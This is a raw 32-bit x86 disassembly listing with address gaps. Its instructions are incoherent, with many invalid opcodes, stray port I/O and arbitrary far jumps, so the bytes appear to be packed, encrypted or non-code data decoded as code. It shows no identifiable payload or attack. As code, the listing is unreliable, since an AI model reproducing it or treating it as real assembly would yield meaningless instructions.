  41efae:	xchg   edx,eax
  41efaf:	pop    ds
  41efb0:	or     DWORD PTR [di-0x67d3],ecx
  41efb5:	into   
  41efb6:	sbb    BYTE PTR [eax],0xed
  41efb9:	dec    edx
  41efba:	pop    ss
  41efbb:	push   0x7bb4a197
  41efc0:	call   0x8ed17d3e
  41efc5:	sub    dh,BYTE PTR [esi+ebp*8+0x31c4fc7c]
  41efcc:	mov    esi,0x40e1a3da
  41efd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41efd2:	ins    BYTE PTR es:[edi],dx
  41efd3:	pop    ecx
  41efd4:	sbb    al,0x45
  41efd6:	push   esp
  41efd7:	dec    ebx
  41efd8:	cmp    BYTE PTR [ecx+ecx*1+0x28f383b2],al
  41efdf:	mov    ah,cl
  41efe1:	repz xor BYTE PTR [ebp*4-0x2b1f7907],dh
  41efe9:	jle    0x41ef6d
  41efeb:	(bad)  
  41efec:	fst    DWORD PTR [edx+0x0]
	...
  41f056:	mov    ecx,0xff25bf5d
  41f05b:	out    0xbb,eax
  41f05d:	fisttp QWORD PTR [ecx+0x0]
  41f060:	lock imul esp,DWORD PTR [edx],0x23
  41f064:	out    0xd,al
  41f066:	addr16 dec ebp
  41f068:	add    DWORD PTR [eax],eax
  41f06a:	add    BYTE PTR [ecx],al
  41f06c:	add    BYTE PTR [eax],al
  41f06e:	sar    DWORD PTR [esp+esi*4-0x64153dea],1
  41f075:	adc    BYTE PTR [edx-0x6a8881d2],al
  41f07b:	fcmovb st,st(3)
  41f07d:	imul   BYTE PTR [esi-0x2f06b908]
  41f083:	ds retf 0xab92
  41f087:	and    ch,dh
  41f089:	lods   eax,DWORD PTR ds:[esi]
  41f08a:	mov    bh,0x87
  41f08c:	fs int3 
  41f08e:	loope  0x41f012
  41f090:	mov    ch,0x3b
  41f092:	(bad)  
  41f093:	dec    ecx
  41f094:	lock cs mov eax,0x18791739
  41f09b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f09c:	xchg   esi,eax
  41f09d:	inc    ebp
  41f09e:	repnz adc eax,0x814d2c8f
  41f0a4:	xchg   ecx,eax
  41f0a5:	xor    eax,0x89228f76
  41f0aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f0ab:	aaa    
  41f0ac:	inc    DWORD PTR [esi+0x7c]
  41f0af:	lahf   
  41f0b0:	dec    ebx
  41f0b1:	inc    ebp
  41f0b2:	xchg   ecx,eax
  41f0b3:	dec    ebx
  41f0b4:	cmp    DWORD PTR [edi+0x61],esi
  41f0b7:	jb     0x41f138
  41f0b9:	(bad)  
  41f0ba:	es mov bh,0xef
  41f0bd:	cmp    BYTE PTR [ebx],ch
  41f0bf:	in     eax,dx
  41f0c0:	ficom  DWORD PTR [ebp-0x3e]
  41f0c3:	push   es
  41f0c4:	mov    DWORD PTR [eax-0x37503b54],eax
  41f0ca:	aas    
  41f0cb:	xchg   esi,eax
  41f0cc:	mov    ch,BYTE PTR [ebx+0x4552133a]
  41f0d2:	sbb    al,0x6c
  41f0d4:	jmp    0x41f0ea
  41f0d6:	or     DWORD PTR [ebx-0x4f6fa464],ebx
  41f0dc:	push   esi
  41f0dd:	pop    edi
  41f0de:	xchg   esp,eax
  41f0df:	stc    
  41f0e0:	lods   al,BYTE PTR ds:[esi]
  41f0e1:	xchg   ecx,eax
  41f0e2:	int    0xd8
  41f0e4:	add    al,bh
  41f0e6:	fwait
  41f0e7:	popf   
  41f0e8:	jg     0x41f105
  41f0ea:	adc    al,0x50
  41f0ec:	xor    al,0xb2
  41f0ee:	lahf   
  41f0ef:	test   BYTE PTR [ecx-0x77],bh
  41f0f2:	pop    esp
  41f0f3:	xchg   esp,eax
  41f0f4:	push   edi
  41f0f5:	pop    es
  41f0f6:	inc    eax
  41f0f7:	adc    dl,BYTE PTR [ebp+0x3cd5c5a9]
  41f0fd:	cmp    al,0xc2
  41f0ff:	(bad)  
  41f100:	or     cl,ah
  41f102:	ins    BYTE PTR es:[edi],dx
  41f103:	fwait
  41f104:	mov    eax,ds:0x2669eee5
  41f109:	mov    ss,WORD PTR [ecx-0x56]
  41f10c:	pop    ebp
  41f10d:	sar    ah,1
  41f10f:	dec    edi
  41f110:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f111:	or     edx,eax
  41f113:	pop    ebp
  41f114:	xlat   BYTE PTR ds:[ebx]
  41f115:	jmp    0x41f11c
  41f117:	cmc    
  41f118:	adc    eax,0xd6a8c277
  41f11d:	mov    ch,0x5e
  41f11f:	(bad)  
  41f120:	out    dx,eax
  41f121:	fdivr  QWORD PTR [eax+0x4a]
  41f124:	mov    al,0xd2
  41f126:	mov    ah,0x34
  41f128:	inc    eax
  41f129:	cli    
  41f12a:	jmp    0xb2e0d8c1
  41f12f:	in     eax,0xc7
  41f131:	aad    0xcd
  41f133:	sbb    eax,0x3195ca1e
  41f138:	fiadd  WORD PTR [ebx+eax*1]
  41f13b:	xchg   DWORD PTR [ecx],edx
  41f13d:	js     0x41f1ac
  41f13f:	cdq    
  41f140:	push   esp
  41f141:	push   esi
  41f142:	mov    cl,0x80
  41f144:	fwait
  41f145:	mov    al,0x33
  41f147:	retf   0x827b
  41f14a:	data16 adc al,0xeb
  41f14d:	fucomp st(1)
  41f14f:	adc    al,0xa6
  41f151:	mov    cl,0x80
  41f153:	ret    
  41f154:	adc    eax,0x814518b9
  41f159:	dec    ecx
  41f15a:	sub    BYTE PTR [edx+0x18],cl
  41f15d:	fcomip st,st(7)
  41f15f:	and    cl,BYTE PTR ss:[ecx+0x1e]
  41f163:	xlat   BYTE PTR ds:[ebx]
  41f164:	cdq    
  41f165:	dec    ebx
  41f166:	push   eax
  41f167:	arpl   WORD PTR [edi],ax
  41f169:	mov    esi,0x91eb643c
	...
  41f1d6:	fild   QWORD PTR [edx+ebp*1+0x6c]
  41f1db:	mov    ebx,0x3824ffdf
  41f1e0:	(bad)  
  41f1e1:	jmp    0x4e67:0x71d6fd85
  41f1e8:	add    DWORD PTR [eax],eax
  41f1ea:	add    BYTE PTR [ecx],al
  41f1ec:	add    BYTE PTR [eax],al
  41f1ee:	and    ah,al
  41f1f0:	data16 jnp 0x41f23e
  41f1f3:	and    edx,DWORD PTR [esi]
  41f1f5:	fmul   DWORD PTR [ecx+ebp*4]
  41f1f8:	add    eax,0xf3b8674e
  41f1fd:	mov    dh,dh
  41f1ff:	xchg   BYTE PTR [ebx+esi*4+0x5e],bh
  41f203:	cmp    al,0xb3
  41f205:	ret    0x774a
  41f208:	iret   
  41f209:	stos   DWORD PTR es:[edi],eax
  41f20a:	retf   
  41f20b:	repnz daa 
  41f20d:	dec    edi
  41f20e:	xchg   ecx,eax
  41f20f:	loope  0x41f23c
  41f211:	push   eax
  41f212:	adc    BYTE PTR [ebx],cl
  41f214:	neg    edx
  41f216:	neg    BYTE PTR [ecx]
  41f218:	cmp    esp,DWORD PTR [esi-0x3a0a813]
  41f21e:	bswap  ebp
  41f220:	xchg   dh,bl
  41f222:	adc    DWORD PTR [ebx],0x2b5cc44c
  41f228:	jp     0x41f1f2
  41f22a:	xor    eax,0xbe272d7b
  41f22f:	push   0xffffffd6
  41f231:	pop    esi
  41f232:	adc    eax,esi
  41f234:	sbb    ecx,DWORD PTR [edx+ecx*2+0x43]
  41f238:	repnz out 0xe2,eax
  41f23b:	inc    esp
  41f23c:	dec    esp
  41f23d:	add    BYTE PTR [edx],ah
  41f23f:	add    BYTE PTR [eax-0x712490fa],al
  41f245:	sbb    cl,BYTE PTR ds:0xe6623f48
  41f24b:	inc    edi
  41f24c:	or     BYTE PTR [ebx-0xb4a1de],dl
  41f252:	pop    edx
  41f253:	xchg   esi,eax
  41f254:	stos   BYTE PTR es:[edi],al
  41f255:	jnp    0x41f21d
  41f257:	mov    ch,BYTE PTR [eax+0x706d2397]
  41f25d:	imul   esi,DWORD PTR [eax*8+0x7516c989],0xc
  41f265:	fidivr DWORD PTR [ebx]
  41f267:	push   ebx
  41f268:	repz adc DWORD PTR [eax-0x19a5ea6e],edi
  41f26f:	add    BYTE PTR [ebx+0x1f7cacc6],bh
  41f275:	test   al,0xd6
  41f277:	push   ebx
  41f278:	fisub  WORD PTR [ebp-0x3fed3c06]
  41f27e:	sub    ch,ah
  41f280:	jo     0x41f2b0
  41f282:	jle    0x41f246
  41f284:	jg     0x41f29c
  41f286:	loop   0x41f270
  41f288:	and    BYTE PTR [eax-0x3dd69752],ah
  41f28e:	pop    ebx
  41f28f:	add    eax,0xf2458eca
  41f294:	jno    0x41f307
  41f296:	inc    eax
  41f297:	push   ss
  41f298:	mov    gs,WORD PTR [ecx-0x3157c31d]
  41f29e:	pop    edx
  41f29f:	and    dh,cl
  41f2a1:	ror    BYTE PTR [esi-0x45],1
  41f2a4:	scas   eax,DWORD PTR es:[edi]
  41f2a5:	bound  ecx,QWORD PTR [ecx+0x26e1e4f3]
  41f2ab:	push   ebx
  41f2ac:	push   esp
  41f2ad:	jle    0x41f298
  41f2af:	xor    edx,DWORD PTR [edi+0x13b00abe]
  41f2b5:	inc    ecx
  41f2b6:	and    DWORD PTR [edi+0x4f951951],ebp
  41f2bc:	arpl   WORD PTR [esi],bx
  41f2be:	or     eax,0xf8213068
  41f2c3:	call   0x1feb439b
  41f2c8:	dec    esi
  41f2c9:	aaa    
  41f2ca:	jb     0x41f263
  41f2cc:	inc    esi
  41f2cd:	push   ds
  41f2ce:	test   BYTE PTR [ebx-0x67e5f322],dl
  41f2d4:	dec    esi
  41f2d5:	addr16 pop edi
  41f2d7:	int3   
  41f2d8:	and    ebx,edi
  41f2da:	and    BYTE PTR [edx+0x44fdf63f],dl
  41f2e0:	mov    dh,0x2e
  41f2e2:	scas   al,BYTE PTR es:[edi]
  41f2e3:	iret   
  41f2e4:	jo     0x41f2b2
  41f2e6:	lahf   
  41f2e7:	mov    al,0xf6
  41f2e9:	ins    DWORD PTR es:[edi],dx
  41f2ea:	sub    DWORD PTR [edi+edx*8+0xf7],esi
	...
  41f355:	add    BYTE PTR [ecx+0x1b],dl
  41f358:	jmp    DWORD PTR [esi-0x1]
  41f35b:	out    0xd9,al
  41f35d:	aas    
  41f35e:	jo     0x41f34d
  41f360:	sahf   
  41f361:	jb     0x41f2fb
  41f363:	test   ebp,ebp
  41f365:	pop    eax
  41f366:	addr16 dec edi
  41f368:	add    DWORD PTR [eax],eax
  41f36a:	add    BYTE PTR [ecx],al
  41f36c:	add    BYTE PTR [eax],al
  41f36e:	js     0x41f35c
  41f370:	imul   ebp,DWORD PTR [ebx+0x22995dc],0x115e5c6b
  41f37a:	push   esi
  41f37b:	cmp    ebx,DWORD PTR ss:[ebp+0x2da5c450]
  41f382:	mov    ecx,0x3ac6292b
  41f387:	and    DWORD PTR [eax-0xf],0x19
  41f38b:	lods   al,BYTE PTR ds:[esi]
  41f38c:	jp     0x41f393
  41f38e:	arpl   WORD PTR [ebx+0x497bcd39],sp
  41f394:	js     0x41f371
  41f396:	cldemote BYTE PTR [edx]
  41f399:	mov    BYTE PTR [esi],dl
  41f39b:	pushf  
  41f39c:	inc    ebx
  41f39d:	fiadd  WORD PTR [edi-0x48]
  41f3a0:	push   ds
  41f3a1:	cmp    al,0x39
  41f3a3:	(bad)  
  41f3a4:	out    0x9d,al
  41f3a6:	out    dx,eax
  41f3a7:	xchg   edi,eax
  41f3a8:	in     eax,0x2c
  41f3aa:	scas   al,BYTE PTR es:[edi]
  41f3ab:	sub    BYTE PTR [edx],0x21
  41f3ae:	inc    ebp
  41f3af:	add    BYTE PTR [ecx],bl
  41f3b1:	ins    BYTE PTR es:[edi],dx
  41f3b2:	mov    cl,0xd7
  41f3b4:	xlat   BYTE PTR ds:[ebx]
  41f3b5:	retf   0x454f
  41f3b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f3b9:	xor    dh,BYTE PTR [ebx-0x59]
  41f3bc:	loope  0x41f3bf
  41f3be:	aam    0xdd
  41f3c0:	mov    ah,0xec
  41f3c2:	push   0x22
  41f3c4:	imul   ebp,DWORD PTR [esi],0xbbfd998f
  41f3ca:	dec    ebx
  41f3cb:	jae    0x41f34d
  41f3cd:	or     DWORD PTR [ebp+ebx*8-0x3b89cc04],ecx
  41f3d4:	bound  esi,QWORD PTR [edx+0x44]
  41f3d7:	out    dx,al
  41f3d8:	aad    0x2f
  41f3da:	pop    ebx
  41f3db:	and    esp,DWORD PTR [ebx-0x7eb77716]
  41f3e1:	test   eax,0x44af2322
  41f3e6:	mov    cs,WORD PTR [edx+0x5bb5b1c0]
  41f3ec:	test   eax,0x95306c9e
  41f3f1:	fdivr  DWORD PTR ss:[eax+ebp*8-0x17]
  41f3f6:	fsub   DWORD PTR [eax]
  41f3f8:	mov    bh,0x4c
  41f3fa:	fs (bad) 
  41f3fc:	and    BYTE PTR [ebp-0x57],cl
  41f3ff:	cmp    al,0xf7
  41f401:	pusha  
  41f402:	cmp    al,0x2e
  41f404:	nop
  41f405:	imul   BYTE PTR [edx+edi*1-0x3af0357b]
  41f40c:	scas   al,BYTE PTR es:[edi]
  41f40d:	scas   al,BYTE PTR es:[edi]
  41f40e:	mov    al,0x5e
  41f410:	pop    ebp
  41f411:	or     eax,DWORD PTR fs:[eax-0x6c]
  41f415:	call   0x86a5:0xb198b72e
  41f41c:	(bad)  
  41f41d:	jbe    0x41f44c
  41f41f:	popa   
  41f420:	xor    esi,DWORD PTR [edx+0x50]
  41f423:	cmp    BYTE PTR ss:[eax],0xef
  41f427:	or     DWORD PTR [eax+0x2],ecx
  41f42a:	pop    edx
  41f42b:	sbb    dl,dh
  41f42d:	sub    ebp,esi
  41f42f:	xor    DWORD PTR [ebx-0x2e14ca56],eax
  41f435:	push   ecx
  41f436:	push   0xd607bf62
  41f43b:	cmp    eax,0xcd06ec3
  41f440:	add    ebp,esp
  41f442:	ret    0x8a97
  41f445:	(bad)  
  41f446:	fidiv  WORD PTR ds:0x33da7f8f
  41f44c:	pusha  
  41f44d:	into   
  41f44e:	scas   eax,DWORD PTR es:[edi]
  41f44f:	mov    edi,0x743b9441
  41f454:	xor    edx,eax
  41f456:	add    eax,0x33901c59
  41f45b:	clc    
  41f45c:	pop    ds
  41f45d:	cmp    BYTE PTR [edx+0x3eb5706d],ah
  41f463:	mov    dl,0x97
  41f465:	scas   al,BYTE PTR es:[edi]
  41f466:	out    dx,al
  41f467:	gs or  edi,ebx
  41f46a:	sub    BYTE PTR [ebx],dl
  41f46c:	adc    eax,0x1f
	...
  41f4d5:	add    BYTE PTR [edi+eiz*8],bh
  41f4d8:	imul   ebp,edi,0xfffffffb
  41f4db:	out    dx,eax
  41f4dc:	mov    esp,0xd5fd13f7
  41f4e1:	mov    ch,0xdc
  41f4e3:	sub    ah,BYTE PTR [edx-0x42]
  41f4e6:	addr16 push eax
  41f4e8:	add    DWORD PTR [eax],eax
  41f4ea:	add    BYTE PTR [ecx],al
  41f4ec:	add    BYTE PTR [eax],al
  41f4ee:	xchg   esp,eax
  41f4ef:	fiadd  WORD PTR [edx+0x4]
  41f4f2:	ja     0x41f530
  41f4f4:	sbb    eax,0x743b174a
  41f4f9:	add    al,0x31
  41f4fb:	imul   eax,DWORD PTR [ebx+ecx*4+0x19835ce6],0x6703c8f9
  41f506:	dec    esp
  41f507:	pop    es
  41f508:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f50a:	xchg   ecx,eax
  41f50b:	add    bl,BYTE PTR [ebx+0x39253be1]
  41f511:	push   ebp
  41f512:	fs lock es and edi,esp
  41f517:	jmp    0x41f4ae
  41f519:	sbb    cl,BYTE PTR [edx]
  41f51b:	mov    esi,0xfd5d10e9
  41f520:	test   eax,0xf155d880
  41f525:	fwait
  41f526:	xor    esi,edi
  41f528:	in     eax,0xec
  41f52a:	xor    BYTE PTR [edi+0x58053507],dh
  41f530:	hlt    
  41f531:	xor    eax,0xd9ea4579
  41f536:	mov    esp,0x478dbd87
  41f53c:	cmp    ebx,DWORD PTR [edx]
  41f53e:	les    ebp,FWORD PTR [esi+0x40165d4]
  41f544:	dec    esp
  41f545:	sub    esp,esp
  41f547:	push   ds
  41f548:	adc    bh,dl
  41f54a:	sub    DWORD PTR [ebx],0x46af44d0
  41f550:	arpl   WORD PTR [edx+0x53c75ea2],di
  41f556:	test   eax,0x9d6d32c4
  41f55c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f55d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f55e:	mov    eax,ss:0x3ebc10e2
  41f564:	mov    ecx,0x1a86d88d
  41f569:	and    eax,0xa2e490f7
  41f56e:	mov    al,ds:0xf0071250
  41f573:	dec    ebx
  41f574:	in     eax,0xee
  41f576:	sbb    bh,ah
  41f578:	jae    0x41f513
  41f57a:	push   ebp
  41f57b:	mov    edx,0xa1625076
  41f580:	mov    edi,0xf78bf5b5
  41f585:	cmp    esi,DWORD PTR [eax]
  41f587:	outs   dx,BYTE PTR ds:[esi]
  41f588:	(bad)  [esi+0x4e5277ef]
  41f58e:	jp     0x41f606
  41f590:	jg     0x41f5fe
  41f592:	scas   al,BYTE PTR es:[edi]
  41f593:	cmc    
  41f594:	call   0x6f8b:0x4c9e2a11
  41f59b:	(bad)  
  41f59c:	pop    ebp
  41f59d:	in     al,dx
  41f59e:	ret    0xf0d4
  41f5a1:	int3   
  41f5a2:	add    al,0x34
  41f5a4:	cmc    
  41f5a5:	stc    
  41f5a6:	aaa    
  41f5a7:	jge    0x41f5f3
  41f5a9:	pusha  
  41f5aa:	add    eax,0x16299cf1
  41f5af:	imul   edx,DWORD PTR [eax],0x7c815c86
  41f5b5:	and    DWORD PTR [ebx-0x57],edx
  41f5b8:	push   ebx
  41f5b9:	pusha  
  41f5ba:	(bad)  
  41f5bb:	out    dx,al
  41f5bc:	stc    
  41f5bd:	cmp    BYTE PTR [eax-0x5f],0xc2
  41f5c1:	add    DWORD PTR [ebx+0x2c],ebx
  41f5c4:	inc    edx
  41f5c5:	or     ebp,0x65eb7adf
  41f5cb:	mov    dl,0x86
  41f5cd:	cmp    eax,0x5ce9cd25
  41f5d2:	test   DWORD PTR [edx],esi
  41f5d4:	cmp    al,BYTE PTR gs:[ebx-0x25190a39]
  41f5db:	mov    cl,0xaf
  41f5dd:	popa   
  41f5de:	pop    ss
  41f5df:	in     eax,dx
  41f5e0:	push   esi
  41f5e1:	jnp    0x41f573
  41f5e3:	mov    esp,0x98d71f2e
  41f5e8:	mov    al,ds:0xd2104fd0
  41f5ed:	inc    edx
	...
  41f656:	js     0x41f68c
  41f658:	add    bh,bl
  41f65a:	dec    esi
  41f65b:	(bad)  
  41f65c:	stc    
  41f65d:	mov    bh,0xb7
  41f65f:	jmp    0x828c:0x5b56d422
  41f666:	addr16 push ecx
  41f668:	add    DWORD PTR [eax],eax
  41f66a:	add    BYTE PTR [ecx],al
  41f66c:	add    BYTE PTR [eax],al
  41f66e:	neg    edx
  41f670:	rcl    edi,0x82
  41f673:	loopne 0x41f6a7
  41f675:	pop    esp
  41f676:	das    
  41f677:	mov    fs,WORD PTR [edi-0x36ac2ce0]
  41f67d:	xchg   edi,eax
  41f67e:	pop    edx
  41f67f:	add    eax,DWORD PTR [ecx]
  41f681:	je     0x41f65e
  41f683:	sub    al,0x77
  41f685:	mov    bh,0xbf
  41f687:	dec    eax
  41f688:	jg     0x41f678
  41f68a:	add    BYTE PTR ds:0x22a6e0f4,bh
  41f690:	jb     0x41f69c
  41f692:	repnz stos BYTE PTR es:[edi],al
  41f694:	jmp    0x4e7:0x973308be
  41f69b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f69c:	dec    ebx
  41f69d:	mov    cl,0x1c
  41f69f:	inc    esp
  41f6a0:	out    0x2f,eax
  41f6a2:	dec    ebx
  41f6a3:	ss pop ecx
  41f6a5:	int3   
  41f6a6:	(bad)  
  41f6a7:	(bad)  
  41f6a8:	popa   
  41f6a9:	xor    DWORD PTR [ecx+0x62943267],0x173c4450
  41f6b3:	fidivr WORD PTR [eax-0x71b4e2a6]
  41f6b9:	jge    0x41f6e2
  41f6bb:	or     eax,0xeaa9889a
  41f6c0:	or     eax,0x116648fa
  41f6c5:	popa   
  41f6c6:	mov    bl,0x8f
  41f6c8:	leave  
  41f6c9:	mov    ebp,0x74583ad0
  41f6ce:	(bad)  
  41f6cf:	in     al,0x1c
  41f6d1:	pushf  
  41f6d2:	mov    esi,0xe874b6d4
  41f6d7:	xchg   esi,eax
  41f6d8:	in     al,0x65
  41f6da:	punpckhwd mm5,QWORD PTR [ebp-0x33]
  41f6de:	push   es
  41f6df:	adc    al,0x48
  41f6e1:	sub    eax,0xc3806a2e
  41f6e6:	jl     0x41f6dd
  41f6e8:	pop    ss
  41f6e9:	into   
  41f6ea:	outs   dx,DWORD PTR ds:[esi]
  41f6eb:	push   es
  41f6ec:	push   ss
  41f6ed:	mov    ebp,0x6473d4de
  41f6f2:	pop    edx
  41f6f3:	mov    eax,ds:0xa3ec6e4a
  41f6f8:	xor    al,BYTE PTR [ebp+0x6ec3e0ff]
  41f6fe:	cdq    
  41f6ff:	rcl    BYTE PTR [edi],1
  41f701:	xchg   edx,eax
  41f703:	adc    eax,0x2fe3e015
  41f708:	cli    
  41f709:	or     esp,DWORD PTR [edx-0x4a]
  41f70c:	xor    BYTE PTR [edx-0x71],ch
  41f70f:	in     eax,0x66
  41f711:	pop    ebp
  41f712:	jno    0x41f735
  41f714:	mov    ebx,DWORD PTR [eax+edx*1-0x2265fa86]
  41f71b:	loope  0x41f762
  41f71d:	adc    ecx,ebx
  41f71f:	add    bh,al
  41f721:	add    ah,BYTE PTR ds:0x384a07c
  41f727:	xchg   esi,eax
  41f728:	sbb    DWORD PTR [ebp-0x1f61dc10],ebx
  41f72e:	xor    bl,BYTE PTR [eax-0x27e18de7]
  41f734:	in     eax,0x4e
  41f736:	enter  0xf2e6,0xaa
  41f73a:	retf   0x9d9f
  41f73d:	mov    bh,bl
  41f73f:	fbstp  TBYTE PTR [ebx-0x2a]
  41f742:	mov    DWORD PTR [ecx+esi*8],esi
  41f745:	lock cli 
  41f747:	mov    edx,0xff9c44a1
  41f74c:	ja     0x41f761
  41f74e:	cmp    ah,BYTE PTR [edi]
  41f750:	inc    ecx
  41f751:	lods   eax,DWORD PTR ds:[esi]
  41f752:	xor    dh,0xd9
  41f755:	and    al,dl
  41f757:	mov    bh,0xce
  41f759:	jmp    0xab54:0xc4b30940
  41f760:	lds    ebp,FWORD PTR [eax+0x1a6eb89]
  41f766:	jg     0x41f736
  41f768:	loop   0x41f75b
  41f76a:	mov    al,ds:0xedd225
	...
  41f7d3:	add    BYTE PTR [eax],al
  41f7d5:	add    BYTE PTR [edx-0x5081dcc4],dl
  41f7db:	jg     0x41f7bc
  41f7dd:	cld    
  41f7de:	call   0x16b9:0x5c6c62d2
  41f7e5:	in     al,dx
  41f7e6:	addr16 push edx
  41f7e8:	add    DWORD PTR [eax],eax
  41f7ea:	add    BYTE PTR [ecx],al
  41f7ec:	add    BYTE PTR [eax],al
  41f7ee:	mov    cl,0x4f
  41f7f0:	hlt    
  41f7f1:	xor    eax,0x8cde921c
  41f7f6:	jb     0x41f7f9
  41f7f8:	fld    DWORD PTR [eax]
  41f7fa:	cli    
  41f7fb:	ja     0x41f83b
  41f7fd:	sti    
  41f7fe:	and    DWORD PTR [ecx+0x18d6128],eax
  41f804:	add    al,BYTE PTR [ebx+eiz*1-0x65dc690a]
  41f80b:	rcl    DWORD PTR [ebx+0x44],cl
  41f80e:	inc    eax
  41f80f:	add    edx,DWORD PTR ds:0x6f526d9e
  41f815:	(bad)
  41f818:	inc    esi
  41f819:	loopne 0x41f7db
  41f81b:	dec    BYTE PTR [edi]
  41f81d:	adc    BYTE PTR [ecx],ah
  41f81f:	jmp    0x41f84a
  41f821:	pusha  
  41f822:	mov    dh,BYTE PTR [edi+edi*4-0x671384ee]
  41f829:	add    ebx,DWORD PTR [ebx+0x69]
  41f82c:	stos   DWORD PTR es:[edi],eax
  41f82d:	or     al,BYTE PTR [edi+0x2d]
  41f830:	sub    al,0xf9
  41f832:	shl    DWORD PTR [ecx+0x7d],cl
  41f835:	cmp    BYTE PTR [edi-0x66f08d6],dh
  41f83b:	and    ebp,DWORD PTR [ecx-0x15331dbb]
  41f841:	mov    ds:0xe68bfe27,al
  41f846:	xor    ah,dl
  41f848:	sub    cl,BYTE PTR [edi+esi*8]
  41f84b:	adc    esp,DWORD PTR [esi+eiz*8-0x6c3d3638]
  41f852:	std    
  41f853:	and    eax,0x32b6f3d4
  41f858:	or     dl,BYTE PTR [edx]
  41f85a:	test   BYTE PTR [ecx],bl
  41f85c:	mov    ss,WORD PTR [edi-0x4be6f915]
  41f862:	cmp    BYTE PTR [eax-0x60],bl
  41f865:	ds loope 0x41f896
  41f868:	and    al,0x98
  41f86a:	into   
  41f86b:	(bad)
  41f86e:	sub    bh,BYTE PTR [esi-0x80aa5eb]
  41f874:	adc    DWORD PTR [ecx+0x3e],ebx
  41f877:	hlt    
  41f878:	inc    eax
  41f879:	not    DWORD PTR ss:[eax-0x1d]
  41f87d:	xlat   BYTE PTR ds:[ebx]
  41f87e:	outs   dx,BYTE PTR ds:[esi]
  41f87f:	aas    
  41f880:	gs ss push 0x76
  41f884:	xor    eax,0x2f8496d0
  41f889:	mov    esi,es
  41f88b:	int    0x88
  41f88d:	jbe    0x41f8b9
  41f88f:	sbb    BYTE PTR [eax-0x7d784a35],dl
  41f895:	test   DWORD PTR [edi],esi
  41f897:	xlat   BYTE PTR ds:[ebx]
  41f898:	dec    eax
  41f899:	pop    ss
  41f89a:	xchg   esp,eax
  41f89b:	fiadd  WORD PTR [ecx]
  41f89d:	xlat   BYTE PTR ds:[ebx]
  41f89e:	adc    bh,cl
  41f8a0:	in     eax,dx
  41f8a1:	sub    edx,DWORD PTR [esi-0x28]
  41f8a4:	out    0xb4,eax
  41f8a6:	mov    ebp,0x802989cb
  41f8ab:	(bad)  
  41f8ac:	ror    DWORD PTR [edx+0xb44dee1],cl
  41f8b2:	pop    ds
  41f8b3:	lds    esi,FWORD PTR [eax-0x2c]
  41f8b6:	mov    cl,BYTE PTR [esi+esi*1-0x3ddcfa66]
  41f8bd:	adc    edx,DWORD PTR [ebx]
  41f8bf:	add    BYTE PTR [eax-0x2e7b41d8],al
  41f8c5:	shl    al,1
  41f8c7:	dec    eax
  41f8c8:	shr    BYTE PTR [edx-0x3f],0x2c
  41f8cc:	sub    eax,0x153c2260
  41f8d1:	push   cs
  41f8d2:	or     bh,dl
  41f8d4:	es push ecx
  41f8d6:	dec    ebx
  41f8d7:	sar    BYTE PTR [edx-0x3e],cl
  41f8da:	sub    DWORD PTR [eax-0x4f4806e4],0x2e
  41f8e1:	mov    ebp,ss
  41f8e3:	sub    eax,0x80c049e8
  41f8e8:	and    ebx,eax
  41f8ea:	pop    esi
  41f8eb:	loop   0x41f931
  41f8ed:	push   ds
	...
  41f956:	mov    eax,ds:0x3b920b9a
  41f95b:	xchg   ebx,eax
  41f95c:	mov    ecx,0x4183febb
  41f961:	pop    edx
  41f962:	fmul   QWORD PTR [esi+0x536709d0]
  41f968:	add    DWORD PTR [eax],eax
  41f96a:	add    BYTE PTR [ecx],al
  41f96c:	add    BYTE PTR [eax],al
  41f96e:	sbb    DWORD PTR [edi],esp
  41f970:	mov    BYTE PTR [ebp-0x3a],al
  41f973:	inc    eax
  41f974:	clc    
  41f975:	sub    DWORD PTR [edi+0x29],esi
  41f978:	jnp    0x41f9aa
  41f97a:	dec    esi
  41f97b:	push   0x4c
  41f97d:	jns    0x41f9a3
  41f97f:	mov    eax,0xb58408e4
  41f984:	jl     0x41f910
  41f986:	test   al,0x2
  41f988:	jp     0x41f950
  41f98a:	ja     0x41f98f
  41f98c:	mov    edi,0xa6d8619c
  41f991:	xchg   ebx,eax
  41f992:	push   esp
  41f993:	jbe    0x41f93a
  41f995:	push   0x5f1eba3e
  41f99a:	sub    bl,al
  41f99c:	jns    0x41f9a6
  41f99e:	mov    eax,0x41d2a9ad
  41f9a3:	xor    ah,BYTE PTR [ebp-0x27]
  41f9a6:	sti    
  41f9a7:	mov    ecx,0xc6aa74c3
  41f9ac:	push   ds
  41f9ad:	xchg   ebp,eax
  41f9af:	ss (bad) 
  41f9b1:	daa    
  41f9b2:	into   
  41f9b3:	cmp    edx,DWORD PTR [esi-0xc3e4344]
  41f9b9:	cmp    al,0x6c
  41f9bb:	adc    bh,cl
  41f9bd:	(bad)  
  41f9be:	cmp    al,0x4
  41f9c0:	push   esi
  41f9c1:	pop    eax
  41f9c2:	(bad)  
  41f9c3:	(bad)  
  41f9c5:	std    
  41f9c6:	mov    cl,0x2a
  41f9c8:	mov    ah,0xfc
  41f9ca:	dec    esp
  41f9cb:	mov    esi,0x2da18cda
  41f9d0:	mov    ds:0xf5070e83,eax
  41f9d5:	dec    eax
  41f9d6:	jp     0x41f962
  41f9d8:	push   ds
  41f9d9:	enter  0xa4b,0x11
  41f9dd:	out    dx,al
  41f9de:	in     eax,0x40
  41f9e0:	adc    eax,0x589b2367
  41f9e5:	ds repz push 0xcda4fa14
  41f9ec:	arpl   WORD PTR [ecx-0xd],bp
  41f9ef:	add    ch,dh
  41f9f1:	adc    ch,dh
  41f9f3:	mov    dh,0x9e
  41f9f5:	jmp    0x41f9a6
  41f9f7:	lods   al,BYTE PTR ds:[esi]
  41f9f8:	sbb    BYTE PTR [edx+0x1c62277b],ah
  41f9fe:	in     al,0x31
  41fa00:	in     al,0x24
  41fa02:	rcr    BYTE PTR [ebx+ebx*1],1
  41fa05:	out    0x58,eax
  41fa07:	das    
  41fa08:	lods   al,BYTE PTR ds:[esi]
  41fa09:	fcmovnu st,st(1)
